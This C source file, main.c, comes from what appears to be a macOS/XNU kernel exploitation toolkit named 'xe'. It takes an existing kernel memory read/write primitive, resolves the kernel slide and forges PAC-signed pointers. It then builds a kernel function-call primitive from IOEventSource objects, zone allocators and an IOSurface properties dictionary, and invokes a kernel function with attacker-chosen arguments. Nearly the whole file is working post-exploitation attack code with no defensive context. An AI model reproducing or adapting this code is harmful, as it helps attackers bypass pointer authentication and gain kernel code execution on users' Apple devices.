//
//  main.c
//  xe
//
//  Created by admin on 11/20/21.
//

#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>

#include <xe/memory/kmem.h>
#include <xe/memory/kmem_remote.h>
#include <xe/slider/kernel.h>
#include <xe/allocator/iosurface.h>
#include <xe/xnu/proc.h>
#include <xe/util/pacda.h>
#include <xe/util/kalloc_heap.h>
#include <xe/iokit/os_dictionary.h>
#include <xe/iokit/os_array.h>
#include <xe/iokit/io_registry_entry.h>
#include <xe/iokit/io_surface.h>
#include <xe/util/zalloc.h>
#include <xe/util/kfunc_basic.h>
#include <xe/util/ptrauth.h>
#include <xe/util/assert.h>

#include "macos_params.h"



int test_pacda(int argc, const char* argv[]) {
    xe_assert_cond(argc, ==, 2);
    
    struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(backend);
    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(backend));
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    printf("[INFO] pid: %d\n", getpid());
    printf("[INFO] proc: %p\n", (void*)proc);
    
    for (int i=0; i<10; i++) {
        uintptr_t ptr = proc;
        uintptr_t ctx = 0xabcdef;
        uintptr_t signed_ptr;
        
        int error = xe_util_pacda_sign(proc, ptr, ctx, &signed_ptr);
        if (error) {
            printf("[ERROR] ptr sign failed, err: %d\n", error);
            return 1;
        }
        
        printf("[INFO] signed ptr: %p\n", (void*)signed_ptr);
    }
    return 0;
}

int main(int argc, const char* argv[]) {
    struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(backend);
    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(backend));
    
    uintptr_t record_function = xe_slider_kernel_slide(FUNC_OS_REPORT_WITH_BACKTRACE);
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE)), 1);
    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), 128), 1);
    
    xe_util_kfunc_basic_t kfunc = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 1);
    
    uintptr_t io_event_source = xe_util_kfunc_build_event_source(kfunc, record_function, "XE: Hi!");
    
    xe_iosurface_allocator_t allocator;
    int error = xe_iosurface_allocator_create(&allocator);
    xe_assert_err(error);
    
    size_t alloc_idx;
    error = xe_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
    xe_assert_err(error);
    error = xe_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
    xe_assert_err(error);
    
    uintptr_t surface;
    error = xe_io_surface_scan_all_clients_for_prop("iosurface_alloc_1", &surface);
    xe_assert_err(error);
    
    uintptr_t props = xe_kmem_read_uint64(KMEM_OFFSET(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET));
    error = xe_os_dictionary_set_value_of_key(props, "iosurface_alloc_0", io_event_source);
    xe_assert_err(error);
    xe_iosurface_allocator_destroy(&allocator);
    xe_util_kfunc_reset(kfunc);
    return 0;
}
